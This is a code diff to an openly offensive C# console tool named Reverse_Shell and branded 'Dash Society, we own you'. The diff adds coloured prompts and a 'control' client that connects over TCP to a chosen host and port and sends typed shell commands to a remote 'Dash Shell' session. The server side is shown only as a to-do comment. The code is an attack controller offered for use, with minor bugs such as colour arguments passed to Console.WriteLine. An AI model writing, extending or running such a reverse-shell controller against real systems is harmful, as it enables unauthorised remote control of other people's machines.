@@ -26,11 +26,22 @@ namespace Reverse_Shell
             Console.WriteLine(str);
         }
 
-        static void Main(string[] args)
+        public static string Input(String str, ConsoleColor color1, ConsoleColor color2)
+        {
+            Console.ForegroundColor = color1;
+            Console.Write(str);
+            Console.ForegroundColor = color2;
+            
+            return Console.ReadLine();
+        }
+
+        static void Main()
         {
             Console.BackgroundColor = ConsoleColor.Black;
             Console.Clear();
 
+            Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-", ConsoleColor.Gray);
+            Write("> We are Dash Society, we own you <3", ConsoleColor.DarkCyan);
             Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-", ConsoleColor.Gray);
             Write("> Use one of the following commands:", ConsoleColor.DarkCyan);
             Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-", ConsoleColor.Gray);
@@ -38,12 +49,11 @@ namespace Reverse_Shell
             Write("> server    -=-   Start our server.", ConsoleColor.DarkCyan);
             Write("> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n", ConsoleColor.Gray);
 
-            Console.ForegroundColor = ConsoleColor.Cyan;
-
             while (true)
             {
-                Console.Write("$(Option)> ");
-                string option = Console.ReadLine().ToLower();
+                string option = Input("$(DashSociety/Option)> ", ConsoleColor.Blue, ConsoleColor.White).ToLower();
+
+                Console.ForegroundColor = ConsoleColor.DarkGreen;
 
                 if (option.Equals("control"))
                     Client.control();
@@ -61,54 +71,66 @@ namespace Reverse_Shell
         {
             try
             {
-                Console.Write("$(Target)> ");
-                string host = Console.ReadLine();
+                string host = Program.Input("$(DashSociety/Host)> ", ConsoleColor.Blue, ConsoleColor.White);
+                string s_port = Program.Input("$(DashSociety/Port)> ", ConsoleColor.Blue, ConsoleColor.White);
 
-                Console.Write("$(Port)> ");
-                int.TryParse(Console.ReadLine(), out int port);
+                if(int.Parse(s_port) < 0)
+                {
+                    Program.Write("[!] Invalid integral value ;c", ConsoleColor.DarkYellow);
+                    return;
+                };
 
-                Console.WriteLine($"[-] Connecting to {host}:{port} ....");
+                int.TryParse(s_port, out int port);
+
+                Program.Write($"[-] Connecting to {host}:{port} ....", ConsoleColor.DarkGray);
 
                 Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 client.Connect(host, port);
 
                 if (!client.Connected)
                 {
-                    Console.WriteLine("[!] A connection could not be estabilished with the host!");
+                    Program.Write("[!] A connection could not be estabilished with the host!", ConsoleColor.DarkYellow);
                     return;
                 };
 
-                Console.WriteLine($"[+] You are now connected with {host}:{port} !");
-                Console.WriteLine("[-] Starting the interactive Dash Shell ....");
-                Console.WriteLine("[!] Type !bye at any time to exit to the menu.");
+                Program.Write($"[+] You are now connected to {host}:{port} !", ConsoleColor.Gray);
+                Program.Write("[-] Starting the interactive Dash Shell ....", ConsoleColor.DarkGray);
+                Program.Write("[+] Dash Shell session has been summoned!", ConsoleColor.Gray);
+                Program.Write("[?] Type \'!help\' at any time for a list of commands.", ConsoleColor.Gray);
+                Program.Write("[?] Type \'!bye\' at any time to exit to the menu.", ConsoleColor.Gray);
 
                 while (true)
                 {
-                    Console.Write("$(Dash Society/rev_shell)> ");
+                    string str = Program.Input($"$(Dash Society/{host}:{port})> ", ConsoleColor.Blue, ConsoleColor.White);
+                    string lwr = str.ToLower();
 
-                    string str = Console.ReadLine();
-
-                    if(str.ToLower().Equals("!bye"))
+                    if(lwr.Equals("!bye"))
                     {
                         return;
+                    }
+
+                    else if(lwr.Equals("!help"))
+                    {
+
                     };
 
                     byte[] command = Encoding.ASCII.GetBytes(str + "\n");
 
                     client.Send(command);
 
-                    Console.WriteLine("[!] Command has been executed!");
+                    Console.WriteLine("[+] Command has been executed!", ConsoleColor.Gray);
                 };
             }
 
             catch
             { 
-                Console.WriteLine("[!] An error has occurred, please reconnect."); 
+                Console.WriteLine("[!] An error has occurred, please reconnect.", ConsoleColor.DarkYellow); 
             };
         }
     };
     
 
+    // To-Do: Revamp server code:
     class Server
     {
         public static void start()
